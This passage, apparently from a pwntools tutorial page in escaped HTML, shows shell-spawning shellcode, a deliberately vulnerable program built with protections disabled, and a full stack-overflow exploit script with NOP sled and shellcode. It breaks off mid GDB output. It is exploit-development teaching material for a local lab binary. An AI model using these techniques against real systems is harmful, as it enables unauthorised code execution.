+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
+&lt;span style="color:#000">leaky_elf&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">ELF&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;leaky&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">main_addr&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">leaky_elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">symbols&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Print address of main&lt;/span>
+&lt;span style="color:#000">log&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">info&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Main at: &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span> &lt;span style="color:#204a87">hex&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">main_addr&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Disassemble the first 14 bytes of main&lt;/span>
+&lt;span style="color:#000">log&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">info&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">disasm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">leaky_elf&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">main_addr&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">14&lt;/span>&lt;span style="color:#000;font-weight:bold">),&lt;/span> &lt;span style="color:#000">arch&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;x86&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also write ELF files from raw assembly; this is very useful for testing shellcodes.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
+&lt;span style="color:#000">sh_shellcode&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;span style="color:#4e9a06"> mov eax, 11
+&lt;/span>&lt;span style="color:#4e9a06"> push 0
+&lt;/span>&lt;span style="color:#4e9a06"> push 0x68732f6e
+&lt;/span>&lt;span style="color:#4e9a06"> push 0x69622f2f
+&lt;/span>&lt;span style="color:#4e9a06"> mov ebx, esp
+&lt;/span>&lt;span style="color:#4e9a06"> mov ecx, 0
+&lt;/span>&lt;span style="color:#4e9a06"> mov edx, 0
+&lt;/span>&lt;span style="color:#4e9a06"> int 0x80
+&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#000">e&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">ELF&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">from_assembly&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">sh_shellcode&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">vma&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x400000&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">with&lt;/span> &lt;span style="color:#204a87">open&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;test_shell&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#204a87;font-weight:bold">as&lt;/span> &lt;span style="color:#000">f&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
+&lt;span style="color:#000">f&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">write&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">e&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get_data&lt;/span>&lt;span style="color:#000;font-weight:bold">())&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
+&lt;p>This will result in a binary named test_shell which executes the necessary assembly code to spawn a shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ chmod u+x test_shell
+$ ./test_shell
+&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
+&lt;h2 id="shellcode-generation">Shellcode generation&lt;/h2>
+&lt;hr>
+&lt;p>Pwntools comes with the &lt;code>shellcraft&lt;/code> module, which is quite extensive in its capabilities.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">20&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># Construct a shellcode which reads from stdin to a buffer on the stack 20 bytes&lt;/span>
+&lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x14&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">SYS_read&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#000">pop&lt;/span> &lt;span style="color:#000">eax&lt;/span>
+&lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#000">ebx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">ebx&lt;/span>
+&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>
+&lt;span style="color:#000">pop&lt;/span> &lt;span style="color:#000">ecx&lt;/span>
+&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x14&lt;/span>
+&lt;span style="color:#000">pop&lt;/span> &lt;span style="color:#000">edx&lt;/span>
+&lt;span style="color:#204a87">int&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x80&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>It also works with other architectures:&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">arm&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">20&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4294962864&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">20&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#000">eor&lt;/span> &lt;span style="color:#000">r0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">r0&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#0) */&lt;/span>
+&lt;span style="color:#000">movw&lt;/span> &lt;span style="color:#000">r1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#8f5902;font-style:italic">#0xffffeeb0 &amp;amp; 0xffff&lt;/span>
+&lt;span style="color:#000">movt&lt;/span> &lt;span style="color:#000">r1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#8f5902;font-style:italic">#0xffffeeb0 &amp;gt;&amp;gt; 16&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">r2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#8f5902;font-style:italic">#0x14&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">r7&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#8f5902;font-style:italic">#(SYS_read) /* 3 */&lt;/span>
+&lt;span style="color:#000">svc&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>
+&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">mips&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">20&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
+&lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">read&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x14&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#000">slti&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">a0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">zero&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xFFFF&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">a0&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#000">li&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">a1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xffffeeb0&lt;/span>
+&lt;span style="color:#000">li&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">t9&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">~&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x14&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">not&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">a2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">t9&lt;/span>
+&lt;span style="color:#000">li&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">t9&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">~&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">SYS_read&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">/*&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xfa3&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*/&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">not&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">v0&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">$&lt;/span>&lt;span style="color:#000">t9&lt;/span>
+&lt;span style="color:#000">syscall&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x40404&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>These shellcodes can be directly assembled using asm inside your script, and given to the exploited process via the &lt;code>send*&lt;/code> functions.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python"> &lt;span style="color:#000">shellcode&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">asm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;span style="color:#4e9a06"> mov rdi, 0
+&lt;/span>&lt;span style="color:#4e9a06"> mov rax, 60
+&lt;/span>&lt;span style="color:#4e9a06"> syscall
+&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">arch&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;amd64&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
+&lt;p>Most of the time you&amp;rsquo;ll be working with as specific vulnerable program. To avoid specifing architecture for the asm function or to shellcraft you can define the context at the start of the script which will imply the architecture from the binary header.&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#000">context&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">binary&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;./vuln_program&amp;#39;&lt;/span>
+&lt;span style="color:#000">shellcode&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">asm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;span style="color:#4e9a06"> mov rdi, 0
+&lt;/span>&lt;span style="color:#4e9a06"> mov rax, 60
+&lt;/span>&lt;span style="color:#4e9a06"> syscall
+&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#000;font-weight:bold">())&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
+&lt;h2 id="gdb-integration">GDB integration&lt;/h2>
+&lt;hr>
+&lt;p>Most importantly, pwntools provides GDB integration, which is extremely useful.&lt;/p>
+&lt;p>Let&amp;rsquo;s follow an example using the following program:&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#000">extern&lt;/span> &lt;span style="color:#000">gets&lt;/span>
+&lt;span style="color:#000">extern&lt;/span> &lt;span style="color:#000">printf&lt;/span>
+&lt;span style="color:#000">section&lt;/span> &lt;span style="color:#000">.data&lt;/span>
+&lt;span style="color:#f57900">formatstr:&lt;/span> &lt;span style="color:#000">db&lt;/span> &lt;span style="color:#a40000">&amp;#34;&lt;/span>&lt;span style="color:#000">Enjoy&lt;/span> &lt;span style="color:#000">your&lt;/span> &lt;span style="color:#000">leak&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">%p&lt;/span>&lt;span style="color:#a40000">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xa&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>
+&lt;span style="color:#000">section&lt;/span> &lt;span style="color:#000">.text&lt;/span>
+&lt;span style="color:#000">global&lt;/span> &lt;span style="color:#000">main&lt;/span>
+&lt;span style="color:#f57900">main:&lt;/span>
+&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">rbp&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rbp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rsp&lt;/span>
+&lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#000">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">64&lt;/span>
+&lt;span style="color:#000">lea&lt;/span> &lt;span style="color:#000">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">rbp&lt;/span> &lt;span style="color:#000;font-weight:bold">-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">64&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rsi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rbx&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">formatstr&lt;/span>
+&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">printf&lt;/span>
+&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rdi&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rbx&lt;/span>
+&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">gets&lt;/span>
+&lt;span style="color:#000">leave&lt;/span>
+&lt;span style="color:#000">ret&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Compile it with:&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ nasm vuln.asm -felf64
+$ gcc -no-pie -fno-pic -fno-stack-protector -z execstack vuln.o -o vuln
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use this script to exploit the program:&lt;/p>
+&lt;div class="highlight">&lt;pre style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#8f5902;font-style:italic">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#204a87;font-weight:bold">from&lt;/span> &lt;span style="color:#000">pwn&lt;/span> &lt;span style="color:#204a87;font-weight:bold">import&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>
+&lt;span style="color:#000">ret_offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">72&lt;/span>
+&lt;span style="color:#000">buf_addr&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x7fffffffd710&lt;/span>
+&lt;span style="color:#000">ret_address&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">buf_addr&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#000">ret_offset&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">16&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># This sets several relevant things in the context (such as endianess,&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># architecture etc.), based on the given binary&amp;#39;s properties.&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># We could also set them manually:&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># context.arch = &amp;#34;amd64&amp;#34;&lt;/span>
+&lt;span style="color:#000">context&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">binary&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;vuln&amp;#34;&lt;/span>
+&lt;span style="color:#000">p&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">process&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;vuln&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Garbage&lt;/span>
+&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">ret_offset&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;A&amp;#34;&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Overwrite ret_address, taking endianness into account&lt;/span>
+&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">pack&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">ret_address&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Add nopsled&lt;/span>
+&lt;span style="color:#000">nops&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">asm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;nop&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">100&lt;/span>
+&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">nops&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Assemble a shellcode from &amp;#39;shellcraft&amp;#39; and append to payload&lt;/span>
+&lt;span style="color:#000">shellcode&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">asm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#000;font-weight:bold">())&lt;/span>
+&lt;span style="color:#000">payload&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">+=&lt;/span> &lt;span style="color:#000">shellcode&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Attach to process&lt;/span>
+&lt;span style="color:#000">gdb&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">attach&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">p&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Wait for breakpoints, commands etc.&lt;/span>
+&lt;span style="color:#000">raw_input&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Send payload?&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Send payload&lt;/span>
+&lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sendline&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">payload&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
+&lt;span style="color:#8f5902;font-style:italic"># Enjoy shell :-)&lt;/span>
+&lt;span style="color:#000">p&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">interactive&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice the &lt;code>gdb.attach(p)&lt;/code> and raw_input lines. The former will open a new terminal window with GDB already attached. All of your GDB configurations will be used, so this works with PEDA as well. Let&amp;rsquo;s set a breakpoint at the ret instruction from the main function:&lt;/p>
+&lt;pre>&lt;code class="language-gdb" data-lang="gdb">gdb-peda$ pdis main
+Dump of assembler code for function main:
+0x08048440 &amp;lt;+0&amp;gt;: push ebp
